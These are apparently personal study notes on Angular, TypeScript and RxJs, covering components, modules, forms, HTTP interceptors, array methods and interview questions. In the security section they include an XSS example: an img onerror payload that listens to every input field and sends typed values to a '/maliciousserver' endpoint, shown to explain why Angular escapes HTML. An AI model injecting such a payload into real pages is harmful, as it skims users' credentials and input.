# Angular

**Generating a New Project**

```console
ng new <app name>
```

**Starting an Angular Project**

```console
npm start

ng serve
```

**Event Binding**

![Event Binding Syntax](images/event-binding-syntax.png "Event Binding Syntax")

**Property Binding**

![Property Binding Syntax](images/property-binding-syntax.png "Property Binding Syntax")

**Interpolation Syntax**

```ts
{{ password }}
```

**Structural Directives**

![Structural Directives](images/str-attr-directives.png "Structural Directives")

**Deploying Angular Apps**

- **now.sh:** Free, CLI-based deployments. Automatically figures out how to build your app.

```console
npm install -g now

now login
```

***

## Angular Components

**Angular Components**

- All Angular apps made of multiple different components.
- Each component designed to implement one **thing** in the app that is visible on the screen.
- A component wraps up all the HTML and code to make one little widget work correctly.
- A component can be reused multiple times in the same application.
- Components can be nested, or shown inside of each other.
- Every app has a component called the **App** component, and it is always the most parent component.
- Each component has its own:
    - Component Class
    - Component Template
    - Component CSS File
    - Spec File

**Generating a New Component**

```console
ng generate component <name>
```

**App Bootup Process**

- Angular loads up each component class file, inspects the **selector** property.
- Angular then takes a look at the HTML document that got loaded into the browser.
- `<app-root>` found! Angular finds a component with a matching **selector**.
- Angular creates an instance of that component.
- Angular turns the instance's template into real HTML, then sticks it into the **app-root** element (the **host** element).
- While inspecting the app's template, Angular sees the **app-card** element.
- Angular creates an instance of that component.
- Angular turns the instance's template into real HTML, then sticks it into the **app-card** element (the **host** element).

**CSS Styling**

![Styling](images/styling.png "Styling")

**Communicating from Parent to Child**

![Input Binding](images/communicating-from-parent-to-child.png "Input Binding")

![Input Binding - Diagram](images/component-communication.png "Input Binding Diagram")

### Pipes

- Functions that format data for use in a template.
- Only used in a template.
- Some pipes built into Angular.

```console
ng generate pipe convert
```

### Directives

- Can be used to modify the structure or properties of HTML elements.
- Used only in a template.

```console
ng generate directive class
```

**Communicate from parent to child component**

```html
<!-- Parent Component Template -->
<app-card [title]=" 'Black Rock' "></app-card>
```

```ts
// Child component class
import { Input } from '@angular/core';

class ChildComponent {
    @Input() title: string;
} 
```

**ngClass replacement**

```ts
import { Directive, ElementRef, Input } from '@angular/core';

@Directive({
  selector: '[appClass]'
})
export class ClassDirective {
  constructor(private element: ElementRef) {}
  @Input('appClass') set classNames(classObj: any) {
    for (let key in classObj) {
      if (classObj[key]) {
        this.element.nativeElement.classList.add(key);
      } else {
        this.element.nativeElement.classList.remove(key);
      }
    }
  }
}
```

### Module System

```console
ng new comps --routing
```

**Module Types**

- **Domain:** Wraps up all the components needed to implement one single feature.
- **Routed:** Domain module plus tied to routes.
- **Routing:** Defines routing rules.
- **Service:** Defines services that will be used in multiple parts of the app.
- **Widget:** Defines some reusable components that will be used in multiple other modules.

**Generating Modules**

```console
ng generate module MODULE_NAME --routing

ng g m MODULE_NAME --routing
```

```console
ng generate component elements/ElementsHome
```

- **--routing** flag tells Angular to make this module ready for navigation.

**Module Property Definitions**

- **Modules:**
    - declarations: List of components, pipes, directives that are created in this module.
    - imports: List of other modules that this module depends upon.
    - exports: List of components, pipes, directives that this module makes available to other modules.
    - providers: Old way of connecting modules and services.
    - bootstrap: Used by the AppModule only to declare what component will be displayed first.

![Router Outlet](images/router-outlet.png "Router Outlet")

**app.component.html**

```html
<router-outlet></router-outlet>
```

### Lazy Loading with Modules

**Implementing Lazy Loading**

- Choose which module should be lazy loaded.
- For each of these modules, remove any import statements for those modules from anywhere else in your project.
- In the **AppRoutingModule**, define a **Route** in the **routes** array to specify when to load up that module.
- In your loaded module's Routing file, edit the **path** of each route to be relative to the path you specified in the
**AppRoutingModule**.

![Lazy Loading](images/lazy-loading.png "Lazy Loading")

**NgContent**

![NgContent](images/ng-content.png "NgContent")

### Lifecycle Hooks

- **ngOnInit:** Called once after this component first displayed on the screen and after Angular has
set any properties passed down from the parent component.
- **ngOnDestroy:** Called once when Angular is about to remove this component (for example, when we navigate
to a different route!).
- **ngOnChanges:** Called anytime a property of the component changed (including when a parent component passed down the data).

***

## Typescript

- Superset of Javascript (it has all the features of JS + more).
- We write TS during development, but the browser still runs JS.
- Provides zero speed or performance benefits!
- The only goal of Typescript is to help you catch error in your code editor instead of while 
your app is running.

```console
npm init -y

npm install typescript ts-node-dev
```

**Type Interference**

- Typescript is smart! It can figure out things for us.
- If we initialize and assign a variable on a single line, Typescript will try to figure out the type
of variable for us.
- We rely on this behavior extremely frequently except in a couple of corner cases.

**Why Types?**

- Typescript knows about the different properties and methods that every type has!
- If we refer to properties or methods that don't exist on a value, it will display an error.

```console
npx typescript --init
```

**Decorators**

- Plain functions.
- Called when the file first gets executed (runtime), not when an instance of class is created.
- Can be applied to a class, a property, a method, an accessor, or an argument method.
- Receives different arguments depending on where it gets used.
- Can be a plain decorator or a decorator factory.
- Used to mess around with the internals of the class in clever ways.

```ts
const valueWrapper = <T>(value: T): T[] => {
    return [value];
};
```

***

## Data and HTTP Requests

**Services**

- Used to **fetch/store/update** any kind of data in our app.
- Almost always where we are going to put network requests.
- Data flows from a service to a component.
- Services are implemented as classes.
- Angular will automatically create a single instance of each service for us.

**Services Behavior**

```ts
constructor(private wikipedia: WikipediaService) {}
```

- **constructor:** Gets called automatically whenever an instance of **AppComponent** is created.
- **private wikipedia:** wikipedia will be added as a private property automatically to the instance of the App component.
- **WikipediaService:** wikipedia will be of type **Instance of WikipediaService**.

![Service Injector](images/service-injector.png "Service Injector")

**Dependency Injection**

- Components, services and other things in Angular **ask** for dependencies, rather than creating them directly.
- Components need other things to work correctly. 
- Our components could create an instance of those things themselves. 
- Instead, we create them separately and pass them in to the constructor.
- The **automatic** nature of DI not strictly required, we could do this all manually by hand.
- The goal is to make testing easier.
- Theoretically makes code reuse and code changes easier.

***

## App Security in Angular 

![Escaping HTML Characters](images/escape-html-chars.png "Escaping HTML Characters")

### XSS Attacks

**Cross-Site Scripting (XSS) Attacks**

- Allows malicious users to run JS a code on other user's browsers.
- This bad JS code can be used to steal credentials, make requests, etc.
- **Angular has you covered** - it will automatically escape HTML.

```js
<img src="" onerror="
document.querySelectorAll('input').forEach((el) => {
    el.addEventListener('input', (event) => {
        fetch(`/maliciousserver?value=${event.target.value}`);
    });
});" />
```

```ts
xss = '<img src="" onerror="alert(123)" />';
```

```html
<!-- will not display alert-->
<div [innerHTML]="xss"></div>
```

***

## RxJs

**Notes on Rxjs**

- Separate library from Angular.
- Used extensively by Angular for managing data.
- We use this instead of **promises** or **async/await** for handling async stuff.
- Not strictly required! We can use **promises** and **async/await**!
- **RxJs** makes building some kinds of features really easy compared to writing normal code.
- Hard, probably the hardest thing in the world of JS.

![Event Diagram](images/rxjs-diagram-event.png "Event Diagram")

![Event Diagram RXJS Terms](images/diagram-rxjs-terms.png "Event Diagram RXJS Terms")

**Operators**

- Functions that do some specific processing on the incoming value.
- We chain together operators to build up a processing pipeline.
- 75% of RxJs is memorizing the different operators.
- There are some very generic operators and some very specific ones.
- For any given problem, you will probably decide to use one operator, then later realize you could
have more easily used another.
- Take a look at exactly what value is coming out of your observable, the figure out what operators
you need to implement your app.

![Processing](images/processing.png "Processing")

**Major Operator Groups**

- **Transform:** Take in a value, do some processing, return a new value.
- **Filtering:** Modifies the flow of events in a pipe (group them together, pause them, delete them).
- **Creation:** Creates a new observable.

**Specific Operators**

![Pluck Operator](images/pluck-operator.png "Pluck Operator")

**Unicast Observables**

- Emit a separate set of values for each observer that subscribes.
- All the operators in a pipe will be executed for each separate observer that subscribes.
- Can easily lead to bad behavior!

![Unicast Observables](images/unicast-observables.png "Unicast Observables")

**Multicast Observables**

- Emit a single set of values for all observers that subscribe.
- All the operators in a pipe executed just once.
- The observable will be **reset** if it gets **completed** or **errored** then another subscriber added.
- Quickly runs into issues with a later subscriber not seeing earlier events!

![Multicast Observables](images/multicast-observables.png "Multicast Observables")

**Hot vs Cold Observables**

![Hot vs Cold Observables](images/hot-cold-observable.png "Hot vs Cold Observables")

- **Hot Observable:** Single event stream shared for all subscribers old and new.
- **Cold Observable:** Event stream recreated for each new subscriber.

![Hot Observable](images/hot-observable.png "Hot Observable")

- Describe the term Observable:
    - An Observable is an object that will emit events.
- Describe the term Operator:
    - An Operator added to a pipe, and processed values flowing through pipe.
- Describe the term Observer:
    - An Observer handles values or errors that flow out of an operator or pipe.

### Typescript + RxJs

```ts
interface Car {
  year: number;
  color: string;
  running: boolean;
  make: {
    name: string,
    dateCreated: number
  }
}

const observable = new Observable<Car>((observer) => {
  observer.next({
    year: 2000,
    color: 'red',
    running: true,
    make: {
      name: 'Chevy',
      dateCreated: 1950
    }
  });
}).pipe(
  pluck('make', 'name')
);

observable.subscribe(value => {
  console.log(value);    // Chevy
});
```

***

## Forms

![Reactive vs Template](images/reactive-template-form.png "Reactive vs Template")

**Form Properties**

- **valid:** Angular has validated whatever the user entered successfully.
- **invalid:** The value in the input is invalid.
- **pending:** Validation is currently running on this field.
- **disabled:** Ignore user input this field and don't validate it.
- **touched:** User clicked into then out of a field.
- **untouched:** User hasn't clicked into then out of this field.
- **pristine:** User hasn't clicked on this field at all.
- **dirty:** User has changed the value of this field.

![Reactive vs Template](images/reactive-vs-template-forms.png "Reactive vs Template")

***

## Authentication app

```console
ng g m Auth --routing
ng g m Shared
ng g c auth/Signin
ng g c auth/Signup
ng g c shared/Input
```

![Auth App routing diagram](images/auth-app-routing.png "Auth App routing diagram")

**Async Error Validation**

![Async Error Validation](images/async-error-validation.png "Async Error Validation")

**Signup**

![Signup process](images/signup-process.png "Signup process")

**Guard**

- **canActivate:** User can visit the route.
- **canActivateChild:** User can visit this child route.
- **canLoad:** User can load this lazily-loaded module and access the routes inside of it.

```console
ng generate guard auth/Auth
```

### Route Information

- **Observable:** Emits values whenever some specific part of the URL changes.
- **Snapshot:** Simple description of what the URL is **right now**.

***

## Type Script

### Type Annotations and Type Inference

- Type annotations:
    - Code we add to tell Typescript what type of value a variable will refer to.
    - Developers tell Typescript the type.
- Type inference:
    - Typescript tries to figure out what type of value a variable refers to.
    - Typescript guesses the type.
    
**Typescript Types**

- **Primitive Types:**  number, boolean, void, undefined, string, symbol, null. 
- **Object Types:** functions, arrays, classes, objects.
    
**Type inference**

- Typescript guesses the type. Use Always!
    
**Annotations**

- Developers tell typescript a type.

```ts
// When to use annotations
// 1) Function that returns the 'any' type
const json = '{"x": 10, "y": 20}';
const coordinates: { x: number, y: number } = JSON.parse(json);
console.log(coordinates);

// 2) When we declare a variable on one line
// and initialize it later
let words = ['red', 'green', 'blue'];
let foundWord: boolean;

for (let i = 0; i < words.length; i++) {
    if (words[i] === 'green') {
        foundWord = true;
    }
}

// 3) Variable whose type cannot be inferred correctly
let numbers = [-10, -1, 12];
let numberAboveZero: boolean | number = false;

for (let i = 0; i < numbers.length; i++) {
    if (numbers[i] > 0) {
        numberAboveZero = numbers[i];
    }
}
```

**Annotations Around Functions**

- Type annotations for functions: Code we add to tell Typescript what type of arguments a function will
receive and what type of values it will return.
- Type inference for functions: Typescript tries to figure out what type of value a function will return. 

**Annotations and Objects**

```ts
const profile = {
    name: 'alex',
    age: 20,
    coords: {
        lat: 0,
        lng: 15
    },
    setAge(age: number) {
        this.age = age;
    }
};


const { age, name }: { age: number, name: string } = profile;
const { coords: { lat, lng } }: { coords: {lat: number, lng: number} } = profile;
```

**Tuple**

- **Tuple:** Array-like structure where each element represents some property of a record.

```ts
const drink = {
    color: 'brown',
    carbonated: true,
    sugar: 40
};

// Type alias
type Drink = [string, boolean, number];

const pepsi: Drink = ['brown', true, 40];
const sprite: Drink = ['clear', true, 40];
const tea: Drink = ['brown', false, 0];
```

**Interfaces**

```
Interfaces + Classes = How we get really strong code reuse in TS
```

- **Interfaces:** Creates a new type, describing the property names and value types of an object.

**Classes**

- **Classes:** Blueprint to create an object with some fields (values) and methods (functions) to represent a **thing**.

**Class Method Modifiers**

- **public:** This method can be called anywhere, any time.
- **private:** This method can be called by other methods in this class.
- **protected:** This method can be called by other methods in this class, or by other methods in child classes.

```console
npm install -g parcel-bundler
```

- Tool to help us run Typescript in the browser.

```console
npm install @types/faker
```

### TS compiler

- Turns TS to JS code.

```console
tsc index.ts

tsc --init

tsc -w

npm init -y

npm install nodemon concurrently
```

**Abstract Classes**

- Can't be used to create an object directly.
- Only used as a parent class.
- Can contain real implementation for some methods.
- The implemented methods can refer to other methods that don't actually exist yet
(we still have to provide names and types for the un-implemented methods).
- Can make child classes promise to implement some other methods.

**Interfaces vs Abstract Classes**

- **Interfaces:**
    - Sets up a contract between different classes.
    - Use when we have very different objects that we want to work together.
    - Promotes loose coupling.
- **Inheritance / Abstract Classes:**
    - Sets up a contract between different classes.
    - Use when we are trying to build up a definition of an object.
    - Strongly couples classes together.
    
### Modules

- Organizes code in a project.
- Contains a set of components, services, pipes and directives.
- Some modules built into Angular, others we create on our own.
- Forces you to organize your code.
- Can have a huge impact on how quickly your app starts up.      

### How to structure services

**How to Wire Up Services in a Module World**

- Add the Service to a module's **providers** array.
- Use `@injectable` decorator.

### Subject Variations

- **Async Subject:** 
    - Same as subject, but also doesn't emit any values unitil it is marked as **complete**. 
    - Only last value emitted.
- **Behavior Subject:** 
    - Same as subject, but also takes an initial **seed** value. 
    - New subscribers instantly get the most recent values.
- **Reply Subject:**
    - Same as subject, but also new subscribers instantly get sent all previously emitted values.

```console
npm install angular-notifier

ng g c login --skipTests --module app

mvn spring-boot:run

# Loading Spinner
npm install --save ngx-loading@2.0.1

ng build
```

## Event binding

```
(click) - round bracket method binding
<button (click)="onButtonClick()">Greet me</button>
```

## Selective Display

```
<div [hidden]="some-expression">

<div *ngIf="some-expression">
```

**Template reference**

```
@ViewChild
```

**Read property - Template reference**

**Write property - Property binding `@Input()`**

***

## Some Interview Questions

**Angular**

- What is Angular and why do we use it?
    - Angular is a JavaScript framework for building web applications. 
    - It is used for creating dynamic and interactive user interfaces, making it a popular choice for building 
    single-page applications.
- What are the key features of Angular?
    - Some key features of Angular include two-way data binding, dependency injection, a modular architecture, 
    and a powerful template language.
- What are the differences between AngularJS and Angular?
    - AngularJS is the first version of Angular, while Angular is the second version and is also known as "Angular 2+". 
    - The biggest difference between the two is that Angular is a complete rewrite of AngularJS and is not backwards-compatible.
- What is an Angular component?
    - An Angular component is a reusable piece of code that controls a section of the UI. 
    - It consists of a template, a class, and metadata.
- What is a directive in Angular?
    - A directive in Angular is a class with a `@Directive` decorator. 
    - It is used to add behavior to an existing element or component. 
    - There are three types of directives in Angular: components, structural directives, and attribute directives.
- What is a service in Angular?
    - A service in Angular is a class with a `@Injectable` decorator. 
    - It is used to share data and logic across different components.
- What is dependency injection in Angular?
    - Dependency injection in Angular is a way to provide a service or a value to a component or a directive. 
    - It allows for loose coupling between the objects in an application and makes the code easier to test and maintain.
- What is the difference between a component and a directive in Angular?
    - A component is a directive with a template, while a directive is a class with a `@Directive` decorator. 
    - A component controls a section of the UI, while a directive adds behavior to an existing element or component.
- What is a module in Angular?
    - A module in Angular is a class with a `@NgModule` decorator. 
    - It is used to group together related components, directives, and services.
- What is the difference between a module and a component in Angular?
    - A module is used to group together related components, directives, and services, while a component controls 
    a section of the UI.
- What is the difference between a service and a provider in Angular?
    - A service is a class with a `@Injectable` decorator and is used to share data and logic across different components. 
    - A provider is a way to configure a service and can be either a class or a value.
- What is the difference between a template and a templateUrl in Angular?
    - A template is a string that contains the HTML for a component, while a templateUrl is a path to an HTML file that 
    contains the template for a component.
- What is the difference between a component and a module in Angular?
    - A component controls a section of the UI, while a module is used to group together related components, directives, 
    and services.
- What is the difference between a directive and a pipe in Angular?
    - A directive is a class with a `@Directive` decorator and is used to add behavior to an existing element 
    or component, while a pipe is a class with a `@Pipe` decorator and is used to transform data in a template.
- What is the difference between a directive and a service in Angular?
    - A directive is a class with a `@Directive` decorator and is used to add behavior to an existing element 
    or component, while a service is a class with a `@Injectable` decorator and is used to share data and logic across 
    different components.
- What is a route in Angular?
    - A route in Angular is a way to navigate between different views or pages in an application. 
    - It is defined by a path and a component.
- What is a router outlet in Angular?
    - A router outlet in Angular is a placeholder where the router inserts the component for the current route.
- What is a routerLink in Angular?
    - A routerLink in Angular is a directive that binds an element to a route. 
    - It is used to navigate to a different route when the element is clicked.
- How does data binding work in Angular?
    - Data binding in Angular allows for the automatic synchronization of data between a component and its template. 
    - It can be done in two ways, one-way data binding (from component to view) and two-way data binding 
    (from component to view and vice versa).
- How can you debug an Angular application?
    - There are different ways to debug an Angular application, but some common methods include using the browser's 
    developer tools, logging messages to the console, and using a debugging tool like Augury.

**Angular REST application**

- In Angular, the most commonly used library for making HTTP requests is the `HttpClient` module, which is part of the 
`@angular/common/http` package. 
- This module provides a powerful set of abstractions for working with HTTP requests and responses, including features 
such as request and response interceptors, request caching, and support for typed request and response objects.
- Here's an example of how to use the `HttpClient` module to make a GET request to a RESTful API:

```ts
import { HttpClient } from '@angular/common/http';

...

constructor(private http: HttpClient) { }

...

this.http.get('https://api.example.com/data').subscribe(data => {
    console.log(data);
});
```

- In this example, the `http.get()` method is used to make a GET request to the specified URL. 
- The `subscribe()` method is used to subscribe to the response and handle the data that is returned.
- You can also use the `http.post()`, `http.put()`, `http.patch()`, and `http.delete()` methods to make `POST`, `PUT`, 
`PATCH`, and `DELETE` requests, respectively.
- Additionally, you can also use third party libraries like `rxjs` to handle the async data.
- For more advanced use cases, you can use `rxjs` operators like `map`, `catchError`, `retry` etc to handle errors, 
retries, and data transformations.

```ts
import { map, catchError } from 'rxjs/operators';

this.http.get('https://api.example.com/data')
    .pipe(
        map(data => data.results),
        catchError(error => {
            console.log(error);
            return throwError(error);
        })
    )
    .subscribe(data => {
        console.log(data);
    });
```

- In this example, the map operator is used to extract the results field from the data returned by the API, 
and the catchError operator is used to handle any errors that occur during the request.

**Angular Interceptor**

- In Angular, you can use an HTTP interceptor to automatically add an authentication token to all requests to a 
specific API. 
- An interceptor is a class that implements the `HttpInterceptor` interface and has a method for handling HTTP requests. 
- You can use this method to add the authentication token to the headers of every request before it is sent to the API.
- Here's an example of an interceptor that adds an authentication token to the headers of every request:

```ts
import { Injectable } from '@angular/core';
import { HttpInterceptor, HttpRequest, HttpHandler, HttpEvent } from '@angular/common/http';
import { Observable } from 'rxjs';

@Injectable()
export class AuthInterceptor implements HttpInterceptor {

  intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
    // Get the auth token from the service
    const authToken = localStorage.getItem('authToken');

    // Clone the request and set the new header
    const authReq = req.clone({
      headers: req.headers.set('Authorization', `Bearer ${authToken}`)
    });

    // Pass on the cloned request instead of the original request.
    return next.handle(authReq);
  }
}
```

- In this example, the interceptor is adding the token to the headers of the request with the key `Authorization` and 
the value `Bearer ${authToken}`. 
- You can store the token in the local storage or a service and retrieve it when needed, like in this example.
- To use this interceptor, you need to add it to the providers array of the `@NgModule` decorator of your application 
and also add it to the `HttpClientModule` imports array in the `@NgModule` decorator.

```ts
import { AuthInterceptor } from './auth.interceptor';

@NgModule({
  imports: [
    HttpClientModule
  ],
  providers: [
    {
      provide: HTTP_INTERCEPTORS,
      useClass: AuthInterceptor,
      multi: true
    }
  ]
})
export class AppModule { }
```

- With this setup, the `AuthInterceptor` will be executed for each request made with the `HttpClient` module. 
- This way, you don't need to worry about adding the token to each request individually, 
and you can keep your code clean and maintainable.

***

- If your yourArray is of a complex type, such as a class with date and value fields, you can define the class first 
and then use an array of that class type to store the data returned from the API.
Here's an example:

```ts
import { Component, OnInit } from '@angular/core';
import { YourService } from './your.service';

class YourClass {
  date: Date;
  value: any;
}

@Component({
  selector: 'app-your-component',
  templateUrl: './your-component.component.html',
  styleUrls: ['./your-component.component.css']
})
export class YourComponent implements OnInit {
  yourArray: YourClass[];

  constructor(private yourService: YourService) { }

  ngOnInit() {
    this.yourService.getData().subscribe(data => {
      this.yourArray = data.map(d => {
        return {
          date: new Date(d.date),
          value: d.value
        } as YourClass;
      });
    });
  }
}
```

- Here, getData is a method in the service YourService that makes an API call to retrieve data. 
- The subscribe block is used to subscribe to the observable returned by the getData method and populate the yourArray 
with the data returned from the API. 
- The map function is used to map the data from the API to instances of the YourClass type, with the date and value 
fields populated.

**Angular Arrays**

- Here are some tips for working with arrays in Angular with TypeScript:
    - Use the `map` method to transform elements in an array: The map method can be used to apply a function to each 
    element in an array and return a new array with the transformed elements.
    - Use the `filter` method to extract elements from an array: The filter method can be used to extract elements from 
    an array based on a certain condition.
    - Use the `reduce` method for aggregating data: The reduce method can be used to aggregate data from an array into a 
    single value.
    - Use the `sort` method to sort elements: The sort method can be used to sort elements in an array. You can pass a 
    comparison function to the sort method to sort the elements based on custom criteria.
    - Use the `splice` method to add/remove elements: The splice method can be used to add or remove elements from an array.
    - Use the `slice` method to extract elements: The slice method can be used to extract a portion of an array as a new array.
    - Use the `concat` method to merge arrays: The concat method can be used to merge two or more arrays into a single array.
    - Use the `indexOf` method to find an element: The indexOf method can be used to find the index of an element in an array.
    - Use the `forEach` method to loop through elements: The forEach method can be used to loop through the elements in an 
    array and perform a certain action for each element.
    - Use the `includes` method to check if an array contains an element: The includes method can be used to check if an 
    array contains a certain element.
    
**map**

- Example of using the `map` method to transform elements in an Angular component using TypeScript:

```ts
import { Component } from '@angular/core';

@Component({
  selector: 'app-example',
  template: `
    <ul>
      <li *ngFor="let item of transformedArray">{{item}}</li>
    </ul>
  `,
  styles: [``]
})
export class ExampleComponent {
  originalArray = [1, 2, 3, 4, 5];
  transformedArray = [];

  constructor() {
    this.transformedArray = this.originalArray.map(num => num * 2);
  }
}
```

- In this example, an array originalArray is defined with the values `[1, 2, 3, 4, 5]`. 
- The `map` method is used to transform each element in the originalArray by multiplying it by 2. 
- The result is stored in a new array transformedArray. 
- In the template, the ngFor directive is used to loop through the elements in the transformedArray and display them in 
a list.

```ts
let numbers = [1, 2, 3, "", 4, 5];

let result = numbers.map(num => {
  return num || 0;
});

console.log(result);
// Output: [1, 2, 3, 0, 4, 5]
```


**filter**

- An example of using the filter operator in an Angular component to filter an array of items:

```ts
import { Component } from '@angular/core';

interface Item {
  name: string;
  category: string;
}

@Component({
  selector: 'app-root',
  template: `
    <ul>
      <li *ngFor="let item of items | async">
        {{item.name}} - {{item.category}}
      </li>
    </ul>
  `
})
export class AppComponent {
  items: Observable<Item[]>;

  constructor() {
    this.items = of([
      { name: 'item1', category: 'category1' },
      { name: 'item2', category: 'category2' },
      { name: 'item3', category: 'category1' },
      { name: 'item4', category: 'category2' }
    ]).pipe(
      map(items => items.filter(item => item.category === 'category1'))
    );
  }
}
```

- In this example, an array of Item objects is defined, and an Observable of this array is created using the of operator. 
- The filter operator is then used in a map operation to filter the Item objects and only return those with a category of 
"category1".
- The filtered items are then displayed in a list in the template using the ngFor directive and the async pipe. 
- The async pipe automatically subscribes to the Observable and updates the view whenever the filtered items change.
    
**reduce**

- The reduce method in Angular can be used to reduce an array to a single value by applying a callback function to each 
element.
- Here's an example of how you can use the reduce method to find the sum of all the elements in an array:

```ts
const numbers = [1, 2, 3, 4];
const sum = numbers.reduce((acc, cur) => acc + cur, 0);
console.log(sum); // output: 10
```

- In this example, the reduce method is called on the numbers array and takes two arguments:
    - `acc`: The accumulator. In this example, it starts with an initial value of 0.
    - `cur`: The current value being processed in the array.
- The `reduce` method iterates through each element in the array and calls the callback function with acc and cur. 
- The returned value from the callback function is then assigned to acc and the next iteration begins. 
- Finally, the final value of acc is returned as the result of the reduce method.
    
**sort**

- Here's an example of sorting an array in Angular using the JavaScript `sort()` method:

```ts
import { Component } from '@angular/core';

@Component({
  selector: 'app-root',
  template: `
    <h2>Sorted array: {{ numbers }}</h2>
  `
})
export class AppComponent {
  numbers = [3, 1, 4, 1, 5, 9, 2, 6, 5, 3, 5];

  ngOnInit() {
    this.numbers.sort((a, b) => a - b);
  }
}
```

- In this example, the numbers array is sorted in ascending order using the `sort()` method and a comparison 
`function (a, b) => a - b`. 
- The result is displayed in the template.
    
**splice**

- In Angular, you can use the slice method of the JavaScript Array object to extract a portion of an array and return 
a new array. 
- Here's an example of how to use the `slice` method in an Angular component:

```ts
import { Component } from '@angular/core';

@Component({
  selector: 'app-example',
  template: `
    <ul>
      <li *ngFor="let item of slicedArray">{{ item }}</li>
    </ul>
  `
})
export class ExampleComponent {
  array = [1, 2, 3, 4, 5];
  slicedArray = this.array.slice(1, 3);
}
```

- In this example, the original array contains five elements. 
- The slicedArray is created by calling the slice method on the array, with the start index of 1 and the end index of 3. 
- This will return a new array containing the elements at index 1 and 2 (2 and 3). 
- The slicedArray is then displayed in the template using the ngFor directive.    
    
***

**Angular include module**

- To include the Highcharts library in an Angular project, you can follow these steps:
- Install the Highcharts library: Run the following command in your terminal to install the Highcharts library as a 
dependency in your Angular project:

```
npm install highcharts
```

- Import the Highcharts library in your component: In the component where you want to use Highcharts, import the 
highcharts library as follows:

```
import * as Highcharts from 'highcharts';
```

- Use the Highcharts library in your component: You can now use the Highcharts library to create charts in your component. 
- For example:

```ts
import { Component, OnInit } from '@angular/core';
import * as Highcharts from 'highcharts';

@Component({
  selector: 'app-your-component',
  template: '<div id="chartContainer"></div>',
  styles: ['']
})
export class YourComponent implements OnInit {

  ngOnInit() {
    Highcharts.chart('chartContainer', {
      chart: {
        type: 'bar'
      },
      title: {
        text: 'My chart'
      },
      xAxis: {
        categories: ['Apples', 'Bananas', 'Oranges']
      },
      yAxis: {
        title: {
          text: 'Fruit eaten'
        }
      },
      series: [{
        name: 'Jane',
        data: [1, 0, 4]
      }, {
        name: 'John',
        data: [5, 7, 3]
      }]
    });
  }
}
```

- In this example, the Highcharts.chart method is used to create a chart with the given configuration options. 
- The first argument to this method is the ID of the container element in which the chart should be rendered. 
- In this case, the chart will be rendered in a div with the ID chartContainer.

***

**Empty Elements in subscribe**

- In Angular, you can handle empty elements in a `subscribe` by checking the value of the data before performing any 
operations on it. 
- If the data is empty, you can return immediately or perform an alternate action.
- Here's an example of handling empty elements in a `subscribe`:

```ts
this.dataService.getData()
  .subscribe(data => {
    if (!data) {
      console.error("Data is empty");
      return;
    }
    // perform operations on data
  });
```

- In this example, the `subscribe` method is used to subscribe to an observable that returns data from a data service. 
- The data is checked for emptiness before performing any operations on it. 
- If the data is empty, a message is logged to the console and the function returns immediately. 


















    
    